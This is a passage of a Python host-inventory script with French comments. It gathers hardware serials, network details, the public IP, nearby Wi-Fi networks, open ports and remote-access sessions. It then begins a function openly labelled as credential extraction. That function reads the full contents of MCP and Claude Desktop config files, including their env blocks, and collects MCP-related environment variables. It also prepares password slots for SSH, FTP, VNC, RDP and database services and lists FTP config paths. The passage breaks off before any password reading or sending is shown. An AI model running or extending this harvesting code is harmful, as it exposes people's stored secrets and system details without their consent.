                ["MemTotal", "MemFree", "MemAvailable", "SwapTotal", "SwapFree", "Cached", "Buffers"]}
            
            def _kb_to_bytes(s):
                m = re.search(r"(\d+)", s or "")
                return int(m.group(1)) * 1024 if m else None
            
            details_bytes = {k: _kb_to_bytes(v) for k, v in mem["details"].items()}
            mem["details_gib"] = {k: _to_gib(v) for k, v in details_bytes.items()}
            mem["details_gb"] = {k: _to_gb(v) for k, v in details_bytes.items()}
        except: pass
    
    # Hardware RAM speed
    hw = detect_memory_hardware()
    if hw:
        mem["hardware"] = hw
        if hw.get("speed_mhz_nominal"):
            mem.setdefault("ram", {})["speed_mhz"] = hw["speed_mhz_nominal"]
    
    return mem

@safe(dict)
def detect_memory_hardware() -> Dict[str, Any]:
    """Vitesse RAM par module via dmidecode/system_profiler/wmic."""
    hw = {"modules": []}
    speeds = []
    
    if SYS == "Linux" and shutil.which("dmidecode"):
        r = run_cmd("dmidecode -t memory", timeout=5)
        if r.get("ok") and r.get("stdout"):
            for line in r["stdout"].splitlines():
                m = re.search(r"(?:Configured Memory |)Speed:\s*(\d+)\s*MT/s", line)
                if m:
                    try:
                        speeds.append(int(m.group(1)))
                    except: pass
            if speeds:
                hw["modules"] = [{"speed_mt_s": s, "speed_mhz_approx": s} for s in speeds]
                hw["speed_mhz_nominal"] = Counter(speeds).most_common(1)[0][0]
    
    elif SYS == "Darwin" and shutil.which("system_profiler"):
        r = run_cmd("system_profiler SPMemoryDataType -json", timeout=5)
        if r.get("ok") and r.get("stdout"):
            try:
                def extract_speeds(obj):
                    speeds = []
                    if isinstance(obj, dict):
                        for v in obj.values():
                            if isinstance(v, str):
                                m = re.search(r"\b(\d+)\s*MHz\b", v)
                                if m:
                                    speeds.append(int(m.group(1)))
                            elif isinstance(v, (dict, list)):
                                speeds.extend(extract_speeds(v))
                    elif isinstance(obj, list):
                        for item in obj:
                            speeds.extend(extract_speeds(item))
                    return speeds
                
                data = json.loads(r["stdout"])
                speeds = extract_speeds(data)
                if speeds:
                    hw["modules"] = [{"speed_mhz": s} for s in speeds]
                    try:
                        hw["speed_mhz_nominal"] = mode(speeds)
                    except:
                        hw["speed_mhz_nominal"] = max(speeds)
            except: pass
    
    elif SYS == "Windows" and shutil.which("wmic"):
        r = run_cmd("wmic memorychip get Speed,ConfiguredClockSpeed /format:list", timeout=5)
        if r.get("ok") and r.get("stdout"):
            for block in r["stdout"].split("\n\n"):
                for line in block.splitlines():
                    if "=" in line:
                        k, v = line.split("=", 1)
                        if k.strip().lower() == "speed" and v.strip().isdigit():
                            speeds.append(int(v.strip()))
            if speeds:
                hw["modules"] = [{"speed_mhz": s} for s in speeds]
                hw["speed_mhz_nominal"] = Counter(speeds).most_common(1)[0][0]
    
    return hw

# ======================== HARDWARE ========================
@safe(dict)
def detect_hardware() -> Dict[str, Any]:
    """BIOS, carte mère, disques physiques, licence Windows."""
    info = {}
    
    if SYS == "Linux" and shutil.which("dmidecode"):
        r = run_cmd("dmidecode -t 0 -t 1 -t 2 -t 3 -t 17", timeout=6.0)
        if r.get("ok") and r.get("stdout"):
            bios, sysinfo = {}, {}
            manuf_dates = []
            for line in r["stdout"].splitlines():
                s = line.strip()
                if s.startswith("Vendor:") and not bios.get("vendor"):
                    bios["vendor"] = s.split(":", 1)[1].strip()
                elif s.startswith("Version:") and not bios.get("version"):
                    bios["version"] = s.split(":", 1)[1].strip()
                elif s.startswith("Release Date:"):
                    bios["release_date"] = s.split(":", 1)[1].strip()
                    manuf_dates.append(bios["release_date"])
                elif s.startswith("Manufacturer:") and not sysinfo.get("manufacturer"):
                    sysinfo["manufacturer"] = s.split(":", 1)[1].strip()
                elif s.startswith("Product Name:") and not sysinfo.get("product"):
                    sysinfo["product"] = s.split(":", 1)[1].strip()
                elif s.startswith("Serial Number:") and not sysinfo.get("serial"):
                    sysinfo["serial"] = s.split(":", 1)[1].strip()
            if bios:
                info["bios"] = bios
            if sysinfo:
                info["system"] = sysinfo
            if manuf_dates:
                info["manufacture_dates"] = sorted(set(manuf_dates))
    
    elif SYS == "Darwin" and shutil.which("system_profiler"):
        r = run_cmd("system_profiler SPHardwareDataType -json", timeout=5.0)
        if r.get("ok"):
            info["hardware_overview"] = r.get("stdout")
    
    elif SYS == "Windows":
        # BIOS
        r = run_cmd("wmic bios get ReleaseDate,SMBIOSBIOSVersion /format:list", timeout=5.0)
        if r.get("ok") and r.get("stdout"):
            bios = {}
            for line in r["stdout"].splitlines():
                if "=" in line:
                    k, v = line.split("=", 1)
                    k, v = k.strip().lower(), v.strip()
                    if k == "releasedate" and v:
                        m = re.match(r"(\d{4})(\d{2})(\d{2})", v)
                        bios["release_date"] = f"{m.group(1)}-{m.group(2)}-{m.group(3)}" if m else v
                    elif k == "smbiosbiosversion":
                        bios["version"] = v
            if bios:
                info["bios"] = bios
        
        # Windows license
        lic = run_cmd("wmic path SoftwareLicensingProduct where (Name like 'Windows%%' and PartialProductKey is not null) get Description,PartialProductKey,LicenseStatus /value", timeout=6.0)
        if lic.get("ok") and lic.get("stdout"):
            blocks = [b for b in lic["stdout"].split("\n\n") if "PartialProductKey=" in b]
            if blocks:
                rec = {}
                for line in blocks[0].splitlines():
                    if "=" in line:
                        k, v = line.split("=", 1)
                        k, v = k.strip().lower(), v.strip()
                        if k == "partialproductkey":
                            rec["partial_key_last5"] = v
                        elif k == "licensestatus":
                            rec["license_status"] = v
                        elif k == "description":
                            rec["description"] = v
                            for pat, ch in [("OEM", "OEM"), ("VOLUME|MAK|KMS", "VOLUME"), ("RETAIL", "RETAIL")]:
                                if re.search(pat, v, re.I):
                                    rec["channel"] = ch
                                    break
                if rec:
                    info["windows_license"] = rec
    
    # Physical disks
    disks = []
    try:
        if SYS == "Linux":
            rb = run_cmd("lsblk -J -o NAME,TYPE,MODEL,SERIAL,SIZE,ROTA,TRAN", timeout=3.5)
            if rb.get("ok") and rb.get("stdout", "").strip().startswith("{"):
                j = json.loads(rb["stdout"])
                for block in j.get("blockdevices", []):
                    if block.get("type") == "disk":
                        disks.append({
                            "name": block.get("name"), "model": block.get("model"),
                            "serial": block.get("serial"), "size": block.get("size"),
                            "type": "HDD" if int(block.get("rota") or 0) == 1 else "SSD"
                        })
        elif SYS == "Windows":
            rw = run_cmd("wmic diskdrive get Model,SerialNumber,InterfaceType,MediaType,Size /format:list", timeout=4.0)
            if rw.get("ok") and rw.get("stdout"):
                for block in rw["stdout"].split("\n\n"):
                    rec = {}
                    for line in block.splitlines():
                        if "=" in line:
                            k, v = line.split("=", 1)
                            rec[k.strip().lower()] = v.strip()
                    if rec.get("model"):
                        disks.append({"model": rec.get("model"), "serial": rec.get("serialnumber"),
                                     "interface": rec.get("interfacetype"), "type": rec.get("mediatype"), "size": rec.get("size")})
        if disks: info["disks_physical"] = disks
    except: pass
    
    # PCI devices
    try:
        if SYS == "Linux" and shutil.which("lspci"):
            lp = run_cmd("lspci -nn", timeout=3.0)
            if lp.get("ok"): info["pci_devices"] = lp.get("stdout")
    except: pass
    
    return info

# ======================== STOCKAGE ========================
@safe(dict)
def detect_storage() -> Dict[str, Any]:
    """Partitions montées et usage disque."""
    storage = {"partitions": []}
    root_summary = {}
    
    if psutil:
        try:
            for p in psutil.disk_partitions(all=False):
                try: u = psutil.disk_usage(p.mountpoint)
                except: u = None
                part = {
                    "device": p.device, "mount": p.mountpoint, "fstype": p.fstype, "opts": p.opts,
                    "usage": {
                        "total": u.total, "used": u.used, "free": u.free, "percent": u.percent,
                        "total_gib": _to_gib(u.total), "used_gib": _to_gib(u.used), "free_gib": _to_gib(u.free),
                        "total_gb": _to_gb(u.total), "used_gb": _to_gb(u.used), "free_gb": _to_gb(u.free)
                    } if u else None
                }
                storage["partitions"].append(part)
                if u and p.mountpoint == "/":
                    root_summary = {
                        "mount": "/", "total": u.total, "free": u.free, "used": u.used, "percent": u.percent,
                        "total_gib": _to_gib(u.total), "free_gib": _to_gib(u.free), "used_gib": _to_gib(u.used),
                        "total_gb": _to_gb(u.total), "free_gb": _to_gb(u.free), "used_gb": _to_gb(u.used)
                    }
        except: pass
    else:
        r = run_cmd("df -Pk")
        if r.get("ok") and r.get("stdout"):
            for line in r["stdout"].splitlines()[1:]:
                parts = re.split(r"\s+", line.strip())
                if len(parts) >= 6 and parts[1].isdigit():
                    total, used, free = int(parts[1]) * 1024, int(parts[2]) * 1024, int(parts[3]) * 1024
                    mount = parts[-1]
                    storage["partitions"].append({
                        "device": parts[0], "mount": mount, "fstype": None, "opts": None,
                        "usage": {"total": total, "used": used, "free": free,
                                 "total_gib": _to_gib(total), "used_gib": _to_gib(used), "free_gib": _to_gib(free)}
                    })
                    if mount == "/":
                        root_summary = {"mount": "/", "total": total, "free": free, "used": used,
                                       "total_gib": _to_gib(total), "free_gib": _to_gib(free), "used_gib": _to_gib(used)}
    
    if root_summary: storage["root"] = root_summary
    return storage

# ======================== RESEAU ========================
@safe(dict)
def detect_network() -> Dict[str, Any]:
    """Interfaces réseau, IPs publique/privée, hostname."""
    net = {"interfaces": {}}
    
    if psutil:
        try:
            for name, addr_list in psutil.net_if_addrs().items():
                net["interfaces"][name] = []
                for a in addr_list:
                    try:
                        if hasattr(socket, "AF_LINK") and a.family == socket.AF_LINK:
                            family = "mac"
                        elif a.family == socket.AF_INET:
                            family = "ipv4"
                        elif a.family == socket.AF_INET6:
                            family = "ipv6"
                        else:
                            family = str(a.family)
                        net["interfaces"][name].append({
                            "family": family, "address": a.address,
                            "netmask": a.netmask, "broadcast": getattr(a, "broadcast", None)
                        })
                    except: continue
        except: pass
    
    try:
        hostname = socket.gethostname()
        net["hostname"] = hostname
        net["fqdn"] = socket.getfqdn()
        net["loopback"] = "127.0.0.1"
        try:
            net["primary_ipv4"] = socket.gethostbyname(hostname)
        except:
            net["primary_ipv4"] = None
    except: pass
    
    if not psutil:
        if SYS == "Linux":
            r = run_cmd("hostname -I")
            if r.get("ok"):
                net["private_ipv4"] = [i for i in r["stdout"].split() if i != "127.0.0.1"]
        elif SYS == "Darwin":
            for iface in ("en0", "en1"):
                r = run_cmd(f"ipconfig getifaddr {iface}")
                if r.get("ok"):
                    net.setdefault("private_ipv4", []).append(r["stdout"].strip())

    # Public IP
    for url in ["https://api.ipify.org", "https://ifconfig.me/ip", "https://ipinfo.io/ip"]:
        try:
            with urllib.request.urlopen(url, timeout=1.5) as r:
                data = r.read(64).decode("utf-8", "ignore").strip()
                if data and re.match(r"^[0-9a-fA-F:\.]+$", data):
                    net["public_ip"] = data
                    break
        except: continue
    
    # Interface classification
    try:
        hwport_by_dev = {}
        if SYS == "Darwin" and shutil.which("networksetup"):
            r = run_cmd("networksetup -listallhardwareports")
            if r.get("ok") and r.get("stdout"):
                cur_port = None
                for line in r["stdout"].splitlines():
                    line = line.strip()
                    if line.startswith("Hardware Port:"):
                        cur_port = line.split(":", 1)[1].strip()
                    elif line.startswith("Device:"):
                        dev = line.split(":", 1)[1].strip()
                        if cur_port:
                            hwport_by_dev[dev] = cur_port

        def classify_interface(name):
            role, desc = None, None
            if SYS == "Darwin":
                if name in ("lo", "lo0"):
                    return "loopback", "Boucle locale"
                if name.startswith("utun"):
                    return "vpn_tunnel", "Tunnel/VPN"
                if name.startswith("en"):
                    hp = hwport_by_dev.get(name)
                    if hp:
                        if re.search(r"wi-?fi", hp, re.I):
                            return "wifi", f"Wi-Fi ({hp})"
                        if re.search(r"ethernet|thunderbolt", hp, re.I):
                            return "ethernet", f"Ethernet ({hp})"
            elif SYS == "Linux":
                if name in ("lo", "lo0"):
                    return "loopback", "Boucle locale"
                if re.match(r"^(eth|eno|enp|ens)", name):
                    return "ethernet", "Interface Ethernet"
                if re.match(r"^(wlan|wlp)", name):
                    return "wifi", "Interface Wi-Fi"
                if name.startswith("docker"):
                    return "bridge", "Pont Docker"
            return role, desc

        interfaces_info = {}
        for name in net.get("interfaces", {}):
            role, description = classify_interface(name)
            interfaces_info[name] = {"role": role, "description": description}
        net["interfaces_info"] = interfaces_info
    except: pass

    # Réseaux Wi-Fi à portée (meilleur effort, dépend des droits)
    try:
        wifi = []
        if SYS == "Linux" and shutil.which("nmcli"):
            r = run_cmd("nmcli -t -f ssid,signal dev wifi list", timeout=4.0)
            if r.get("ok") and r.get("stdout"):
                for line in r["stdout"].splitlines():
                    if not line.strip(): continue
                    parts = line.split(":")
                    ssid = parts[0].strip()
                    signal = parts[1].strip() if len(parts) > 1 else None
                    if ssid:
                        wifi.append({"ssid": ssid, "signal": signal})
        elif SYS == "Darwin":
            airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
            if os.path.exists(airport):
                r = run_cmd(f"\"{airport}\" -s", timeout=4.0)
                if r.get("ok") and r.get("stdout"):
                    lines = r["stdout"].splitlines()
                    for line in lines[1:]:  # skip header
                        cols = line.split()
                        if cols:
                            ssid = cols[0]
                            signal = cols[-1] if cols[-1].isdigit() else None
                            wifi.append({"ssid": ssid, "signal": signal})
        elif SYS == "Windows":
            r = run_cmd("netsh wlan show networks mode=Bssid", timeout=5.0)
            if r.get("ok") and r.get("stdout"):
                current_ssid = None
                for line in r["stdout"].splitlines():
                    line = line.strip()
                    if line.startswith("SSID "):
                        current_ssid = line.split(":", 1)[1].strip()
                    elif "Signal" in line and current_ssid:
                        sig = line.split(":", 1)[1].strip()
                        wifi.append({"ssid": current_ssid, "signal": sig})
                        current_ssid = None
        if wifi:
            net["wifi_networks"] = wifi[:30]
    except: pass

    # Connexions réseau actives (limitées)
    if psutil:
        try:
            conns = []
            for c in psutil.net_connections(kind="inet")[:50]:
                conns.append({
                    "laddr": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else None,
                    "raddr": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else None,
                    "status": c.status,
                    "pid": c.pid
                })
            if conns:
                net["connections"] = conns
        except: pass
    
    return net

# ======================== PORTS OUVERTS ========================
@safe(dict)
def detect_open_ports() -> Dict[str, Any]:
    """Détection des ports ouverts, connexions actives et services en écoute."""
    info = {
        "listening_ports": [],
        "established_connections": [],
        "all_connections": [],
        "port_summary": {}
    }

    # Méthode 1 : psutil (plus fiable et cross-platform)
    if psutil:
        try:
            connections = psutil.net_connections(kind="inet")
            listening = []
            established = []
            all_conns = []

            for conn in connections:
                try:
                    conn_info = {
                        "protocol": "tcp" if conn.type == socket.SOCK_STREAM else "udp",
                        "local_ip": conn.laddr.ip if conn.laddr else None,
                        "local_port": conn.laddr.port if conn.laddr else None,
                        "remote_ip": conn.raddr.ip if conn.raddr else None,
                        "remote_port": conn.raddr.port if conn.raddr else None,
                        "status": conn.status,
                        "pid": conn.pid
                    }

                    # Tenter d'obtenir le nom du processus
                    if conn.pid:
                        try:
                            proc = psutil.Process(conn.pid)
                            conn_info["process_name"] = proc.name()
                            conn_info["process_exe"] = proc.exe()
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass

                    all_conns.append(conn_info)

                    # Ports en écoute (LISTEN)
                    if conn.status == "LISTEN":
                        listening.append(conn_info)

                    # Connexions établies
                    elif conn.status == "ESTABLISHED":
                        established.append(conn_info)

                except (AttributeError, ValueError):
                    continue

            info["listening_ports"] = listening[:100]  # Limiter à 100 pour éviter JSON trop gros
            info["established_connections"] = established[:100]
            info["all_connections"] = all_conns[:200]

            # Résumé des ports par protocole
            tcp_ports = set()
            udp_ports = set()
            for conn in listening:
                if conn.get("protocol") == "tcp" and conn.get("local_port"):
                    tcp_ports.add(conn["local_port"])
                elif conn.get("protocol") == "udp" and conn.get("local_port"):
                    udp_ports.add(conn["local_port"])

            info["port_summary"] = {
                "tcp_listening_count": len(tcp_ports),
                "udp_listening_count": len(udp_ports),
                "tcp_listening_ports": sorted(list(tcp_ports))[:50],
                "udp_listening_ports": sorted(list(udp_ports))[:50],
                "established_count": len(established)
            }

        except (PermissionError, psutil.AccessDenied):
            info["error"] = "Permission denied - run with elevated privileges for full port scan"
        except Exception as e:
            info["error"] = f"psutil error: {str(e)}"

    # Méthode 2 : Commandes système (fallback si psutil non disponible)
    else:
        try:
            if SYS == "Linux":
                # Essayer ss d'abord (plus moderne)
                if shutil.which("ss"):
                    r = run_cmd("ss -tunap", timeout=5.0)
                    if r.get("ok"):
                        info["raw_output"] = r["stdout"]
                # Sinon netstat
                elif shutil.which("netstat"):
                    r = run_cmd("netstat -tunap", timeout=5.0)
                    if r.get("ok"):
                        info["raw_output"] = r["stdout"]

            elif SYS == "Darwin":
                # macOS: netstat ou lsof
                if shutil.which("netstat"):
                    r = run_cmd("netstat -an -p tcp", timeout=5.0)
                    if r.get("ok"):
                        info["raw_output_tcp"] = r["stdout"]
                    r = run_cmd("netstat -an -p udp", timeout=5.0)
                    if r.get("ok"):
                        info["raw_output_udp"] = r["stdout"]

                # lsof pour plus de détails
                if shutil.which("lsof"):
                    r = run_cmd("lsof -i -P -n", timeout=5.0)
                    if r.get("ok"):
                        info["lsof_output"] = r["stdout"][:5000]  # Limiter la sortie

            elif SYS == "Windows":
                # Windows: netstat
                r = run_cmd("netstat -ano", timeout=5.0)
                if r.get("ok"):
                    info["raw_output"] = r["stdout"]

            info["note"] = "Install psutil for detailed port information: pip install psutil"

        except Exception as e:
            info["fallback_error"] = str(e)

    # Services communs sur ports connus
    common_ports = {
        20: "FTP Data", 21: "FTP Control", 22: "SSH", 23: "Telnet",
        25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 3306: "MySQL", 5432: "PostgreSQL",
        6379: "Redis", 8080: "HTTP Alt", 8443: "HTTPS Alt", 27017: "MongoDB",
        3389: "RDP", 5900: "VNC", 11434: "Ollama"
    }

    # Identifier les services connus en écoute
    if info.get("port_summary", {}).get("tcp_listening_ports"):
        known_services = {}
        for port in info["port_summary"]["tcp_listening_ports"]:
            if port in common_ports:
                known_services[port] = common_ports[port]
        if known_services:
            info["known_services"] = known_services

    return info

# ======================== ACCÈS DISTANTS (VNC, RDP, SSH) ========================
@safe(dict)
def detect_remote_access() -> Dict[str, Any]:
    """Détection des accès distants à la machine (VNC, RDP, SSH, etc.)."""
    info = {
        "vnc_servers": [],
        "rdp_servers": [],
        "ssh_servers": [],
        "other_remote_access": [],
        "mac_addresses": {},
        "remote_sessions": [],
        "local_sessions": [],
        "summary": {}
    }

    # Ports de services d'accès distant connus
    remote_access_ports = {
        22: "SSH",
        23: "Telnet",
        3389: "RDP (Remote Desktop)",
        5900: "VNC", 5901: "VNC", 5902: "VNC", 5903: "VNC", 5904: "VNC",
        5905: "VNC", 5906: "VNC", 5907: "VNC", 5908: "VNC", 5909: "VNC",
        5800: "VNC HTTP", 5801: "VNC HTTP", 5802: "VNC HTTP", 5803: "VNC HTTP",
        5631: "pcAnywhere", 5632: "pcAnywhere",
        6129: "DameWare",
        24800: "Synergy",
        4899: "Radmin",
        7070: "RealVNC"
    }

    # 1. Détecter les adresses MAC des interfaces réseau
    if psutil:
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == 17:  # AF_LINK (MAC address)
                        info["mac_addresses"][iface] = addr.address
        except Exception:
            pass

    # 2. Détecter les ports d'accès distant en écoute
    vnc_servers = []
    rdp_servers = []
    ssh_servers = []
    other_remote = []

    if psutil:
        try:
            connections = psutil.net_connections(kind="inet")

            for conn in connections:
                if conn.status != "LISTEN":
                    continue

                if not conn.laddr:
                    continue

                port = conn.laddr.port
                local_ip = conn.laddr.ip

                # Déterminer si c'est local ou remote
                is_local = local_ip in ["127.0.0.1", "::1", "localhost"]
                access_type = "local" if is_local else "remote"

                conn_info = {
                    "port": port,
                    "local_ip": local_ip,
                    "access_type": access_type,
                    "pid": conn.pid,
                    "service": remote_access_ports.get(port)
                }

                # Obtenir info processus
                if conn.pid:
                    try:
                        proc = psutil.Process(conn.pid)
                        conn_info["process_name"] = proc.name()
                        conn_info["process_exe"] = proc.exe()
                        conn_info["username"] = proc.username()
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass

                # Classifier par service
                if port == 22:
                    ssh_servers.append(conn_info)
                elif port == 3389:
                    rdp_servers.append(conn_info)
                elif port in range(5800, 5810) or port in range(5900, 5910) or port == 7070:
                    conn_info["vnc_type"] = "HTTP" if port in range(5800, 5810) else "Standard"
                    vnc_servers.append(conn_info)
                elif port in remote_access_ports:
                    other_remote.append(conn_info)

            info["vnc_servers"] = vnc_servers
            info["rdp_servers"] = rdp_servers
            info["ssh_servers"] = ssh_servers
            info["other_remote_access"] = other_remote

        except (PermissionError, psutil.AccessDenied):
            info["error"] = "Permission denied - need elevated privileges"
        except Exception as e:
            info["error"] = f"Error: {str(e)}"

    # 3. Détecter les sessions actives
    remote_sessions = []
    local_sessions = []

    # Détecter via who/w (Linux/macOS)
    if SYS in ["Linux", "Darwin"]:
        if shutil.which("who"):
            r = run_cmd("who -u", timeout=3.0)
            if r.get("ok"):
                for line in r["stdout"].splitlines():
                    parts = line.split()
                    if len(parts) >= 4:
                        session = {
                            "username": parts[0],
                            "terminal": parts[1],
                            "login_time": " ".join(parts[2:4]) if len(parts) >= 4 else None,
                            "idle": parts[4] if len(parts) > 4 else None,
                            "from": parts[5] if len(parts) > 5 else None
                        }

                        # Déterminer si remote ou local
                        from_addr = session["from"]
                        if from_addr and from_addr != "local" and from_addr != ":0" and from_addr != "(:0)":
                            session["type"] = "remote"
                            remote_sessions.append(session)
                        else:
                            session["type"] = "local"
                            local_sessions.append(session)

        # Détecter les connexions SSH établies
        if shutil.which("ss") or shutil.which("netstat"):
            cmd = "ss -tn state established '( dport = :22 or sport = :22 )'" if shutil.which("ss") else "netstat -tn | grep :22"
            r = run_cmd(cmd, timeout=3.0)
            if r.get("ok"):
                for line in r["stdout"].splitlines():
                    if "ESTAB" in line or "ESTABLISHED" in line:
                        parts = line.split()
                        if len(parts) >= 5:
                            local_addr = parts[3] if "ss" in cmd else parts[3]
                            remote_addr = parts[4] if "ss" in cmd else parts[4]

                            # Extraire IP et port
                            if ":" in remote_addr:
                                remote_ip = remote_addr.rsplit(":", 1)[0]
                                remote_port = remote_addr.rsplit(":", 1)[1] if ":" in remote_addr else None
                            else:
                                remote_ip = remote_addr
                                remote_port = None

                            remote_sessions.append({
                                "type": "ssh_connection",
                                "protocol": "SSH",
                                "local_addr": local_addr,
                                "remote_ip": remote_ip,
                                "remote_port": remote_port,
                                "status": "ESTABLISHED"
                            })

    # Windows : query session
    elif SYS == "Windows":
        r = run_cmd("query session", timeout=3.0)
        if r.get("ok"):
            for line in r["stdout"].splitlines()[1:]:  # Skip header
                parts = line.split()
                if len(parts) >= 3:
                    session = {
                        "username": parts[0] if parts[0] != ">" else parts[1],
                        "session_name": parts[1] if parts[0] != ">" else parts[2],
                        "session_id": parts[2] if parts[0] != ">" else parts[3],
                        "state": parts[3] if parts[0] != ">" else parts[4],
                        "type": "remote" if "rdp" in line.lower() or "console" not in line.lower() else "local"
                    }

                    if session["type"] == "remote":
                        remote_sessions.append(session)
                    else:
                        local_sessions.append(session)

    info["remote_sessions"] = remote_sessions
    info["local_sessions"] = local_sessions

    # 4. Détecter les processus d'accès distant
    remote_processes = []

    if psutil:
        remote_process_names = [
            "vncserver", "vnc", "Xvnc", "x11vnc", "tightvncserver",
            "TeamViewer", "teamviewerd", "anydesk", "chrome-remote-desktop",
            "sshd", "ssh", "rdp", "xrdp", "rdesktop", "remmina",
            "VBoxHeadless", "virt-viewer", "spice"
        ]

        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'exe']):
                try:
                    pname = proc.info['name'].lower()
                    if any(rp.lower() in pname for rp in remote_process_names):
                        remote_processes.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name'],
                            "username": proc.info['username'],
                            "exe": proc.info['exe']
                        })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass

    info["remote_processes"] = remote_processes[:20]  # Limiter à 20

    # 5. Résumé
    info["summary"] = {
        "vnc_enabled": len(vnc_servers) > 0,
        "rdp_enabled": len(rdp_servers) > 0,
        "ssh_enabled": len(ssh_servers) > 0,
        "total_remote_access_services": len(vnc_servers) + len(rdp_servers) + len(ssh_servers) + len(other_remote),
        "active_remote_sessions": len(remote_sessions),
        "active_local_sessions": len(local_sessions),
        "mac_addresses_count": len(info["mac_addresses"]),
        "remote_processes_detected": len(remote_processes)
    }

    return info

# ======================== SERVEURS MCP / FTP / PASSWORDS ========================
@safe(dict)
def detect_servers_and_passwords() -> Dict[str, Any]:
    """Détection des serveurs MCP, FTP et extraction de credentials."""
    info = {
        "mcp_servers": [],
        "ftp_servers": [],
        "passwords": {
            "ssh": {},
            "ftp": {},
            "vnc": {},
            "rdp": {},
            "mysql": {},
            "postgresql": {}
        },
        "docker_remote_access": {},
        "cloud_metadata": {},
        "limitations": []
    }

    # 1. SERVEURS MCP INSTALLÉS - DÉTECTION COMPLÈTE
    mcp_servers = []
    mcp_installed_servers = []

    # Chercher les serveurs MCP dans les processus
    if psutil:
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'username', 'cwd', 'exe']):
                try:
                    cmdline = proc.info.get('cmdline', [])
                    cmdline_str = ' '.join(cmdline) if cmdline else ''

                    # Détecter les serveurs MCP
                    if 'mcp' in cmdline_str.lower():
                        # Extraire le nom du serveur MCP de la ligne de commande
                        server_name = None
                        folder_path = proc.info.get('cwd')

                        # Parser la commande pour trouver le nom
                        if '--name' in cmdline_str:
                            idx = cmdline_str.find('--name')
                            name_part = cmdline_str[idx+7:].split()[0]
                            server_name = name_part
                        elif 'npx' in cmdline_str and 'mcp' in cmdline_str:
                            # Pour les serveurs MCP lancés via npx
                            for part in cmdline:
                                if 'mcp' in part.lower() and '/' in part:
                                    server_name = part.split('/')[-1]
                                    break

                        mcp_servers.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name'],
                            "server_name": server_name,
                            "command": cmdline_str[:300],
                            "username": proc.info.get('username'),
                            "folder_path": folder_path,
                            "exe": proc.info.get('exe')
                        })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass

    # Chercher dans les variables d'environnement
    mcp_env_vars = {k: v for k, v in os.environ.items() if 'MCP' in k.upper()}

    # Chercher les configs MCP dans les fichiers et parser pour extraire les serveurs
    mcp_configs = []
    home = os.path.expanduser("~")
    mcp_config_paths = [
        ".config/mcp/config.json",
        ".mcp/servers.json",
        "mcp.json",
        ".claude/mcp_servers.json",
        ".config/claude/claude_desktop_config.json"
    ]

    for config_path in mcp_config_paths:
        fpath = os.path.join(home, config_path)
        if os.path.exists(fpath):
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    mcp_configs.append({
                        "file": config_path,
                        "full_path": fpath,
                        "size": len(content),
                        "content": content
                    })

                    # Parser le JSON pour extraire les serveurs
                    try:
                        config_data = json.loads(content)

                        # Format Claude Desktop : {"mcpServers": {...}}
                        if "mcpServers" in config_data:
                            for server_name, server_config in config_data["mcpServers"].items():
                                mcp_installed_servers.append({
                                    "name": server_name,
                                    "command": server_config.get("command"),
                                    "args": server_config.get("args", []),
                                    "env": server_config.get("env", {}),
                                    "config_file": fpath,
                                    "type": "claude_desktop"
                                })

                        # Format générique : {"servers": [...]}
                        elif "servers" in config_data:
                            if isinstance(config_data["servers"], list):
                                for server in config_data["servers"]:
                                    mcp_installed_servers.append({
                                        "name": server.get("name"),
                                        "command": server.get("command"),
                                        "args": server.get("args", []),
                                        "folder_path": server.get("path"),
                                        "config_file": fpath,
                                        "type": "generic"
                                    })
                            elif isinstance(config_data["servers"], dict):
                                for server_name, server_config in config_data["servers"].items():
                                    mcp_installed_servers.append({
                                        "name": server_name,
                                        "command": server_config.get("command"),
                                        "args": server_config.get("args", []),
                                        "config_file": fpath,
                                        "type": "generic"
                                    })
                    except json.JSONDecodeError:
                        pass
            except:
                pass

    # Chercher les serveurs MCP installés via npm/npx
    npm_mcp_servers = []
    if shutil.which("npm"):
        r = run_cmd("npm list -g --depth=0 --json 2>/dev/null", timeout=5.0)
        if r.get("ok"):
            try:
                npm_data = json.loads(r["stdout"])
                deps = npm_data.get("dependencies", {})
                for pkg_name in deps.keys():
                    if "mcp" in pkg_name.lower():
                        npm_mcp_servers.append({
                            "name": pkg_name,
                            "version": deps[pkg_name].get("version"),
                            "install_type": "npm_global"
                        })
            except:
                pass

    info["mcp_servers"] = {
        "running_processes": mcp_servers,
        "installed_servers": mcp_installed_servers,
        "npm_packages": npm_mcp_servers,
        "environment_vars": mcp_env_vars,
        "config_files": [{"file": c["file"], "path": c["full_path"], "size": c["size"]} for c in mcp_configs],
        "summary": {
            "running_count": len(mcp_servers),
            "installed_count": len(mcp_installed_servers),
            "npm_packages_count": len(npm_mcp_servers),
            "total_detected": len(mcp_servers) + len(mcp_installed_servers) + len(npm_mcp_servers)
        }
    }

    # 2. SERVEURS FTP INSTALLÉS ET CONFIGURÉS
    ftp_servers = []

    # Processus FTP
    ftp_process_names = ['vsftpd', 'proftpd', 'pure-ftpd', 'ftpd', 'wu-ftpd']
    if psutil:
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'exe']):
                try:
                    pname = proc.info['name'].lower()
                    if any(ftp in pname for ftp in ftp_process_names):
                        ftp_servers.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name'],
                            "username": proc.info.get('username'),
                            "exe": proc.info.get('exe')
                        })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass

    # Chercher les configs FTP
    ftp_configs = []
    ftp_config_paths = [
        "/etc/vsftpd.conf",
        "/etc/vsftpd/vsftpd.conf",
        "/etc/proftpd/proftpd.conf",
        "/etc/pure-ftpd/pure-ftpd.conf",
        "/etc/ftpusers"
    ]

